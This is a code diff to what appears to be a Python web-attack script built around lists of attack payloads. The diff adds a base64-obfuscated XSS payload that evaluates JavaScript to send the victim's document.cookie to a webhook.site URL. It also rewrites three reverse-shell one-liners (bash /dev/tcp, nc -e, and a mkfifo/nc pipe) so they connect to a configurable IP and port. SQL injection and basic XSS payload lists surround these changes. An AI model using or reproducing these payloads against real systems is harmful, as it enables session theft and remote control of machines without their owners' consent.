@@ -4,6 +4,15 @@ import base64
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
 
+REVERSE_SHELL_IP = "127.0.0.1"
+REVERSE_SHELL_PORT = 1337
+
+WEBHOOK_URL = "https://webhook.site/your-unique-id"
+XSS_PAYLOAD = """const a = async () => {
+    navigator.sendBeacon(\"{WEBHOOK_URL}\", document.cookie);
+};
+a();"""
+
 def construct_url(url_object):
     parameters = url_object.get("parameters", {})
     path = url_object.get("path", "/")
@@ -51,7 +60,7 @@ sqli_payloads = [
 ]
 
 xss_payloads = [
-    "<script>alert(1)</script>",
+    f"<script>eval(atob('{base64.b64encode(XSS_PAYLOAD.replace('{WEBHOOK_URL}', WEBHOOK_URL).encode()).decode()}'))</script>",
     "<img src=x onerror=alert(1)>",
     "<svg onload=alert(1)>",
     "javascript:alert(1)",
@@ -59,9 +68,9 @@ xss_payloads = [
 ]
 
 reverse_shell_payloads = [
-    "bash -i >& /dev/tcp/10.0.0.1/4242 0>&1",
-    "nc -e /bin/sh 10.0.0.1 4242",
-    "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f",
+    f"bash -i >& /dev/tcp/{REVERSE_SHELL_IP}/{REVERSE_SHELL_PORT} 0>&1",
+    f"nc -e /bin/sh {REVERSE_SHELL_IP} {REVERSE_SHELL_PORT}",
+    f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {REVERSE_SHELL_IP} {REVERSE_SHELL_PORT} >/tmp/f",
 ]
 
 def request_1(
